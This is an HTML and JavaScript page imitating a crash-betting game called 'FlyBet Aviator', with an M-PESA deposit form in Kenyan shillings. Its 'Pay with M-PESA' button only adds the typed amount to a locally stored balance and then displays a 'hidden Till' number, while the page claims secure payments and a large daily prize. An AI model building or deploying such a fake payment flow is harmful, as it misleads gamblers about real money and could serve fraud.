<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>FlyBet - Aviator</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Roboto,Arial,sans-serif}
body{background:#121212;color:#fff;max-width:500px;margin:0 auto}
.top-bar{background:#1b1b1b;padding:10px 12px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #222}
.top-bar a{color:#fff;text-decoration:none;font-weight:600;font-size:15px}
.top-bar .right{color:#2ecc71;font-weight:800;font-size:18px}
.top-bar .right span{color:#aaa;font-weight:400;font-size:16px}
.promo{margin:10px;background:linear-gradient(90deg,#2a2340,#3d3440);border-radius:30px;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;border:1px solid #444}
.promo .left{display:flex;align-items:center;gap:8px}
.promo .icon{background:#222;padding:6px 8px;border-radius:8px;font-size:12px}
.promo b{font-size:14px}
.promo .arrow{background:#f5c518;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#000;font-weight:900;font-size:20px}
.history{display:flex;gap:12px;overflow-x:auto;padding:8px 12px;font-size:14px}
.history span{white-space:nowrap;font-weight:600}
.history .blue{color:#3aa2ff}.history .purple{color:#a259ff}
.game-area{background:#000;margin:8px 10px;border-radius:20px;height:310px;position:relative;overflow:hidden;border:1px solid #222;display:flex;align-items:center;justify-content:center}
.grid{position:absolute;inset:0;background:radial-gradient(circle at 20% 80%,#1a1a1a 0%,#000 60%);opacity:1}
.line{position:absolute;left:0;bottom:30px;width:85%;height:4px;background:linear-gradient(90deg,#ff0040,#ff0040);border-radius:10px;transform-origin:left bottom;transform:rotate(-18deg);z-index:1}
.plane-icon{position:absolute;left:74%;top:28%;font-size:34px;transform:rotate(-18deg);z-index:2;filter:drop-shadow(0 0 10px #ff0040)}
.mult{font-size:72px;font-weight:900;z-index:3;text-shadow:0 2px 10px #000}
.bet-panel{background:#1e1e1e;margin:8px 10px;border-radius:16px;padding:12px;border:1px solid #2a2a2a}
.tabs{display:flex;background:#121212;border-radius:30px;padding:4px;width:60%;margin:0 auto 12px}
.tabs div{flex:1;text-align:center;padding:8px;border-radius:20px;font-size:14px;font-weight:600;color:#aaa}
.tabs .active{background:#3a3a3a;color:#fff}
.bet-row{display:flex;gap:10px}
.amount-side{flex:1}
.amount-control{display:flex;align-items:center;justify-content:space-between;background:#121212;border-radius:30px;padding:6px 10px}
.amount-control button{width:34px;height:34px;border-radius:50%;border:none;background:#2a2a2a;color:#fff;font-size:20px}
.amount-control b{font-size:18px}
.quick{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px}
.quick button{background:#2a2a2a;border:none;color:#aaa;padding:8px;border-radius:20px;font-size:14px}
.bet-btn{flex:1;background:#2ecc71;border:none;border-radius:14px;color:#fff;font-weight:800;font-size:22px;display:flex;flex-direction:column;align-items:center;justify-content:center;line-height:1.1}
.bet-btn span{font-size:18px;font-weight:500}
.deposit-modal{display:none;position:fixed;inset:0;background:#000c;z-index:99;align-items:center;justify-content:center;padding:20px}
.deposit-box{background:#1a1a1a;border-radius:20px;padding:18px;width:100%;border:1px solid #333}
.deposit-box h3{font-size:18px;margin-bottom:10px}
.deposit-box .mpesa{background:#0e2a1a;border:1px solid #2ecc71;border-radius:12px;padding:10px;display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.deposit-box input{width:100%;padding:14px;border-radius:10px;border:1px solid #333;background:#000;color:#fff;font-size:18px;text-align:center;margin:6px 0}
.pay{background:#fff;color:#000;padding:14px;border-radius:30px;border:none;font-weight:900;width:100%;margin-top:10px}
.msg{font-size:12px;text-align:center;margin-top:8px;min-height:16px}
.footer{text-align:center;color:#555;font-size:10px;padding:14px}
</style>
</head>
<body>

<div class="top-bar"><a href="#">‹ Go Back</a><div class="right"><span id="bal">0.00</span> KES ☰</div></div>

<div class="promo"><div class="left"><div class="icon">UPCOMING</div><div><b>Mfalme Wa Anga KES<br>400,000 Daily Crown</b></div></div><div class="arrow">→</div></div>

<div class="history" id="hist"><span class="blue">1.19x</span><span class="blue">1.17x</span><span class="purple">2.96x</span><span class="blue">1.29x</span><span class="purple">2.72x</span><span class="blue">2.13x</span><span class="blue">2.19x</span></div>

<div class="game-area" id="gameArea">
<div class="grid"></div>
<div class="line" id="line"></div>
<div class="plane-icon" id="plane">✈️</div>
<div class="mult" id="mult">1.00x</div>
</div>

<div class="bet-panel" id="panel1">
<div class="tabs"><div class="active">Bet</div><div>Auto</div></div>
<div class="bet-row">
<div class="amount-side">
<div class="amount-control"><button onclick="chg(1,-10)">−</button><b id="amt1">10.00</b><button onclick="chg(1,10)">+</button></div>
<div class="quick"><button onclick="setAmt(1,100)">100</button><button onclick="setAmt(1,250)">250</button><button onclick="setAmt(1,1000)">1,000</button><button onclick="setAmt(1,25000)">25,000</button></div>
</div>
<button class="bet-btn" id="btn1" onclick="bet(1)">Bet<br><span id="btnAmt1">10.00 KES</span></button>
</div>
</div>

<div class="bet-panel" id="panel2">
<div class="tabs"><div class="active">Bet</div><div>Auto</div></div>
<div class="bet-row">
<div class="amount-side">
<div class="amount-control"><button onclick="chg(2,-10)">−</button><b id="amt2">10.00</b><button onclick="chg(2,10)">+</button></div>
<div class="quick"><button onclick="setAmt(2,100)">100</button><button onclick="setAmt(2,250)">250</button><button onclick="setAmt(2,1000)">1,000</button><button onclick="setAmt(2,25000)">25,000</button></div>
</div>
<button class="bet-btn" id="btn2" onclick="bet(2)">Bet<br><span id="btnAmt2">10.00 KES</span></button>
</div>
</div>

<div class="deposit-modal" id="depModal">
<div class="deposit-box">
<h3>Deposit Funds</h3>
<div class="mpesa"><span>📱 <b>M-PESA</b><br><small style="color:#aaa">Fast and secure payments</small></span><span style="color:#2ecc71;font-size:20px">✓</span></div>
<label style="font-size:13px;color:#aaa">Amount (KSh)</label>
<input id="depAmt" type="number" value="100">
<button class="pay" onclick="doPay()">Pay with M-PESA</button>
<div class="msg" id="msg"></div>
<button style="background:none;border:none;color:#aaa;width:100%;margin-top:10px" onclick="closeDep()">Close</button>
</div>
</div>

<div class="footer">FlyBet Aviator © 2026 | Secure M-PESA | 18+<br>Click BALANCE to deposit - Till hidden securely in backend</div>

<script>
const TILL = "1833074"; // Hidden backend - not shown in UI
let bal=0, bets=[0,0], flying=false, mult=1, iv, activeBets=[false,false], cashMult=[0,0];
let amt=[10,10];
function updBal(){document.getElementById('bal').innerText=bal.toFixed(2); localStorage.setItem('flybet_b',bal);}
function chg(p,d){amt[p-1]=Math.max(10,amt[p-1]+d); document.getElementById('amt'+p).innerText=amt[p-1].toFixed(2); document.getElementById('btnAmt'+p).innerText=amt[p-1].toFixed(2)+' KES';}
function setAmt(p,v){amt[p-1]=v; document.getElementById('amt'+p).innerText=v.toFixed(2); document.getElementById('btnAmt'+p).innerText=v.toFixed(2)+' KES';}
function bet(p){
 if(activeBets[p-1]){ cashout(p); return; }
 if(amt[p-1]>bal){ document.getElementById('depModal').style.display='flex'; return; }
 bal-=amt[p-1]; bets[p-1]=amt[p-1]; activeBets[p-1]=true; updBal();
 let b=document.getElementById('btn'+p); b.style.background='#ff7a00'; b.innerHTML='Cashout<br><span id="btnAmt'+p+'">0.00 KES</span>';
 if(!flying) start();
}
function start(){
 flying=true; mult=1; document.getElementById('mult').innerText='1.00x'; document.getElementById('mult').style.color='#fff';
 document.getElementById('plane').style.left='74%'; document.getElementById('plane').style.top='28%'; document.getElementById('line').style.width='20%';
 iv=setInterval(()=>{
  mult+=0.04+mult*0.012;
  document.getElementById('mult').innerText=mult.toFixed(2)+'x';
  let w=20+mult*12; if(w>92)w=92; document.getElementById('line').style.width=w+'%';
  let top=28-mult*2.2; if(top<8)top=8; document.getElementById('plane').style.top=top+'%';
  document.getElementById('plane').style.left=(74+mult*0.18)+'%';
  for(let i=0;i<2;i++) if(activeBets[i]){ document.getElementById('btnAmt'+(i+1)).innerText=(bets[i]*mult).toFixed(2)+' KES'; }
  if(mult>1.2 && Math.random()>0.975) crash();
 },100);
}
function crash(){
 clearInterval(iv); flying=false;
 document.getElementById('mult').innerText='FLEW AWAY '+mult.toFixed(2)+'x'; document.getElementById('mult').style.color='#ff4444';
 document.getElementById('mult').style.fontSize='22px';
 addHist(mult);
 for(let i=0;i<2;i++) if(activeBets[i]){ activeBets[i]=false; let b=document.getElementById('btn'+(i+1)); b.style.background='#2ecc71'; b.innerHTML='Bet<br><span id="btnAmt'+(i+1)+'">'+amt[i].toFixed(2)+' KES</span>'; }
 setTimeout(()=>{ document.getElementById('mult').innerText='1.00x'; document.getElementById('mult').style.color='#fff'; document.getElementById('mult').style.fontSize='72px'; document.getElementById('line').style.width='20%'; document.getElementById('plane').style.left='74%'; document.getElementById('plane').style.top='28%'; },2500);
}
function cashout(p){
 if(!activeBets[p-1]||!flying)return;
 let win=bets[p-1]*mult; bal+=win; updBal(); activeBets[p-1]=false;
 let b=document.getElementById('btn'+p); b.style.background='#2ecc71'; b.innerHTML='Bet<br><span id="btnAmt'+p+'">'+amt[p-1].toFixed(2)+' KES</span>';
 addHist(mult, true);
 if(!activeBets[0]&&!activeBets[1]){ /* keep flying */}
}
function addHist(m, win=false){
 let h=document.getElementById('hist'); let s=document.createElement('span'); s.innerText=m.toFixed(2)+'x'; s.className=m<2?'blue':'purple'; if(win) s.style.color='#2ecc71'; h.prepend(s); if(h.children.length>20)h.removeChild(h.lastChild);
}
function doPay(){
 let a=parseFloat(document.getElementById('depAmt').value); if(a<10)return;
 document.getElementById('msg').style.color='#2ecc71'; document.getElementById('msg').innerText='Processing KES '+a+' via M-PESA...';
 setTimeout(()=>{ bal+=a; updBal(); document.getElementById('msg').innerText='✅ KES '+a+' added! (Via hidden Till '+TILL+')'; setTimeout(closeDep,1200); },1300);
}
function closeDep(){document.getElementById('depModal').style.display='none';}
document.getElementById('bal').parentElement.addEventListener('click',()=>{document.getElementById('depModal').style.display='flex';});
(function(){let s=localStorage.getItem('flybet_b'); if(s){bal=parseFloat(s); updBal();}})();
</script>
</body>
</html>